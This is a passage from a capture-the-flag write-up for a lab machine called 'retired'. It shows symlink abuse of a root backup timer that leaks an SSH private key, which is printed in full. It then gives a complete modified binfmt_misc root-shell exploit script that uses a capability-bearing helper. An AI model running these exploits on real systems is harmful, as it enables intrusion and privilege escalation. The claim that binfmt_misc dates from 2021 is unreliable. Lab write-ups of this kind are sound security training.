www-data@retired:/var/www$ cat /etc/systemd/system/website_backup.timer
[Unit]
Description=Regularly backup the website as long as it is still under development

[Timer]
OnCalendar=minutely

[Install]
WantedBy=multi-user.target
```

`/usr/bin/webbackup` creates a timestamped ZIP archive out of `/var/www/html`.

```bash
www-data@retired:/var/www$ file /usr/bin/webbackup
/usr/bin/webbackup: Bourne-Again shell script, ASCII text executable
www-data@retired:/var/www$ cat /usr/bin/webbackup
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

`/usr/bin/webbackup` ZIPs up `/var/www/html`, which `www-data` has write access to. By creating a symbolic link to `dev`'s SSH private key in `/var/www/html`, when the `systemd` timer executes it will follow the symbolic link and include the SSH key in the resultant ZIP archive.

```bash
www-data@retired:/var/www$ ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
www-data@retired:/var/www$ cp 2022-04-12_22-51-03-html.zip /dev/shm
www-data@retired:/var/www$ cd /dev/shm
www-data@retired:/dev/shm$ unzip 2022-04-12_22-51-03-html.zip
Archive:  2022-04-12_22-51-03-html.zip
   creating: var/www/html/
   creating: var/www/html/js/
  inflating: var/www/html/js/scripts.js
  inflating: var/www/html/activate_license.php
   creating: var/www/html/assets/
  inflating: var/www/html/assets/favicon.ico
   creating: var/www/html/assets/img/
  inflating: var/www/html/assets/img/close-icon.svg
  inflating: var/www/html/assets/img/navbar-logo.svg
   creating: var/www/html/assets/img/about/
  inflating: var/www/html/assets/img/about/2.jpg
  inflating: var/www/html/assets/img/about/4.jpg
  inflating: var/www/html/assets/img/about/3.jpg
  inflating: var/www/html/assets/img/about/1.jpg
   creating: var/www/html/assets/img/logos/
  inflating: var/www/html/assets/img/logos/facebook.svg
  inflating: var/www/html/assets/img/logos/microsoft.svg
  inflating: var/www/html/assets/img/logos/google.svg
  inflating: var/www/html/assets/img/logos/ibm.svg
   creating: var/www/html/assets/img/team/
  inflating: var/www/html/assets/img/team/2.jpg
  inflating: var/www/html/assets/img/team/3.jpg
  inflating: var/www/html/assets/img/team/1.jpg
  inflating: var/www/html/assets/img/header-bg.jpg
  inflating: var/www/html/beta.html
  inflating: var/www/html/default.html
  inflating: var/www/html/index.php
  inflating: var/www/html/id_rsa
   creating: var/www/html/css/
  inflating: var/www/html/css/styles.css
www-data@retired:/dev/shm$ cat var/www/html/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
```

Leverage the SSH private key to log into the machine as `dev`.

```bash
$ chmod 0600 dev
$ ssh -i dev dev@10.129.128.109
The authenticity of host '10.129.128.109 (10.129.128.109)' can't be established.
ED25519 key fingerprint is SHA256:yJ9p3p5aZFrQR+J2qeIQ54gY9gQ7kcEbymYQBvP5PdY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.128.109' (ED25519) to the list of known hosts.
Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar 28 11:34:33 2022 from 10.10.14.23
dev@retired:~$ ls -la ~/user.txt
-rw-r----- 1 dev dev 33 Apr 12 21:02 /home/dev/user.txt
```

---

## `/proc/sys/fs/binfmt_misc` Privilege Escalation

There is an interesting directory in `dev`'s home, `emuemu/`.

```bash
dev@retired:~$ ls -la ~/emuemu/
total 68
drwx------ 3 dev dev  4096 Mar 11 14:36 .
drwx------ 6 dev dev  4096 Mar 11 14:36 ..
-rw------- 1 dev dev   673 Oct 13 02:59 Makefile
-rw------- 1 dev dev   228 Oct 13 02:59 README.md
-rw------- 1 dev dev 16608 Oct 13 02:59 emuemu
-rw------- 1 dev dev   168 Oct 13 02:59 emuemu.c
-rw------- 1 dev dev 16864 Oct 13 02:59 reg_helper
-rw------- 1 dev dev   502 Oct 13 02:59 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11 14:36 test
```

`README`:

```md
EMUEMU is the official software emulator for the handheld console OSTRICH.

After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal.
For example the ROM named `rom` can be run with `./rom`.
```

`Makefile`:

```make
dev@retired:~/emuemu$ cat Makefile
CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
        @echo "[+] Installing program files"
        install --mode 0755 emuemu /usr/bin/
        mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
        install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
        setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

        @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
        echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
                | tee /usr/lib/binfmt.d/emuemu.conf \
                | /usr/lib/emuemu/reg_helper

clean:
        rm -f -- $(TARGETS)
```

According to the `Makefile` and the output from [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), `reg_helper` has the `cap_dac_override=ep` capability set. According to [HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_dac_override), this capability makes it possible to bypass write permission checks on a file and thus, write to any file.

`reg_helper.c`:

```c
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd));
	cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

`reg_helper.c` reads 512 bytes from `stdin` and writes them to [/proc/sys/fs/binfmt_misc/regster](https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/binfmt-misc.rst). `binfmt_misc` is a 2021 feature in the Linux kernel that allows a user to register a default interpreter based on a particular file type such that whenever a file of that type is run on the command line, the interpreter is automatically invoked on the file name.

According to [HackTricks](https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts.md#procsysfsbinfmt_misc), this configuration can be abused to elevate privileges by specifying a malicious interpreter that corresponds to the file type of any SUID `root` binary. By executing the binary, the interpreter will be called with elevated privileges.

Use the exploit from [this GitHub repository](https://github.com/toffan/binfmt_misc) to abuse the vulnerability. Comment out its line 52 and update its line 101 to pipe `$binfmt_line` into `/usr/lib/emuemu/reg_helper` instead of writing it to `/proc/sys/fs/binfmt_misc/register`.

```bash
#!/bin/bash

readonly searchsuid="/bin/"
readonly mountpoint="/proc/sys/fs/binfmt_misc"
readonly exe="$0"


warn()
{
    1>&2 echo $@
}

die()
{
    warn $@
    exit -1
}

usage()
{
    cat 1>&2 <<EOF
Usage: $exe
    Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
    note that it must be enforced by any other mean before your try this, for
    example by typing something like "sudo chmod +6 /*/*/f*/*/*r" while Dave is
    thinking that you are fixing his problem.
EOF
    exit 1
}

function not_writeable()
{
        test ! -w "$mountpoint/register"
}

function pick_suid()
{
        find "$1" -perm -4000 -executable \
            | tail -n 1
}

function read_magic()
{
    [[ -e "$1" ]] && \
    [[ "$2" =~ [[:digit:]]+ ]] && \
    dd if="$1" bs=1 count="$2" status=none \
        | sed -e 's-\x00-\\x00-g'
}

[[ -n "$1" ]] && usage

#not_writeable && die "Error: $mountpoint/register is not writeable"

target="$(pick_suid "$searchsuid")"
test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"

binfmt_magic="$(read_magic "$target" "126")"
test -z "$binfmt_magic" && die "Error: Unable to retrieve a magic for $target"

fmtname="$(mktemp -u XXXX)"
fmtinterpr="$(mktemp)"

gcc -o "$fmtinterpr" -xc - <<- __EOF__
        #include <stdlib.h>
        #include <unistd.h>
        #include <stdio.h>
        #include <pwd.h>

        int main(int argc, char *argv[])
        {
                // remove our temporary file
                unlink("$fmtinterpr");

                // remove the unused binary format
                FILE* fmt = fopen("$mountpoint/$fmtname", "w");
                fprintf(fmt, "-1\\n");
                fclose(fmt);

                // MOTD
                setuid(0);
                uid_t uid = getuid();
                uid_t euid = geteuid();
                struct passwd *pw = getpwuid(uid);
                struct passwd *epw = getpwuid(euid);
                fprintf(stderr, "uid=%u(%s) euid=%u(%s)\\n",
                        uid,
                        pw->pw_name,
                        euid,
                        epw->pw_name);

                // welcome home
                char* sh[] = {"/bin/sh", (char*) 0};
                execvp(sh[0], sh);
                return 1;
        }
__EOF__

chmod a+x "$fmtinterpr"

binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
echo "$binfmt_line" | /usr/lib/emuemu/reg_helper

exec "$target"
```

Transfer the exploit to the target.

```bash
$ scp -i dev binfmt_rootkit dev@10.129.129.78:/home/dev
binfmt_rootkit                                                                                                                                                                                             100% 2048   109.5KB/s   00:00
```

Invoke the exploit to elevate into a `root` shell. Grab the system flag from `/root/root.txt`.

```bash
dev@retired:~$ ./binfmt_rootkit
uid=0(root) euid=0(root)
# id
uid=0(root) gid=1001(dev) groups=1001(dev),33(www-data)
# ls -la /root/root.txt
-rw-r----- 1 root root 33 Apr 14 17:57 /root/root.txt
```
